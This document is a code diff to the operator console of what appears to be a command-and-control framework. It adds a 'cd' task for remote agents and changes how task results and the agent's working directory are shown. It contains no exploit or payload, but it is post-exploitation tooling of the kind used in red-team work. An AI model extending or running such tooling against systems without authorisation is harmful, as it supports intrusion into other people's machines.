@@ -391,6 +391,15 @@ class OperatorShell:
             console.print(f"[green]Assembly queued: {asm_path.name} ({len(payload)}B)[/green]")
             return
 
+        if cmd == "cd":
+            cd_path = " ".join(args) if args else ""
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "cd",
+                arguments=cd_path.encode() if cd_path else b"",
+            )
+            console.print(f"[green]Task queued: cd {cd_path}[/green]")
+            return
+
         # Native agent modules (built into agent binary, no module.yaml)
         native_modules = {
             "whoami": {"desc": "Current user, privileges, groups", "args": False},
@@ -545,9 +554,21 @@ class OperatorShell:
     def _on_task_result(self, session, task):
         """Event handler for task results."""
         marker = "[*]" if task.status.name == "COMPLETE" else "[!]"
-        _print(f"\n{marker} Result from {session.hostname} ({task.module_name}):")
         if not (task.result and task.result.raw):
+            _print(f"\n{marker} Result from {session.hostname} ({task.module_name}): (no output)")
             return
+
+        # Handle cd specially — update agent CWD from result
+        if task.module_name == "cd" and task.status.name == "COMPLETE":
+            new_cwd = task.result.raw.decode("utf-8", errors="replace").strip()
+            if new_cwd and not new_cwd.startswith("cd:"):
+                session.cwd = new_cwd
+                _print(f"\n{marker} {session.hostname}: {new_cwd}")
+            else:
+                _print(f"\n{marker} {session.hostname}: {new_cwd}")
+            return
+
+        _print(f"\n{marker} Result from {session.hostname} ({task.module_name}):")
         mod = self.module_registry.get(task.module_name)
         if mod:
             output = self.output_parser.parse(mod, task.result.raw)
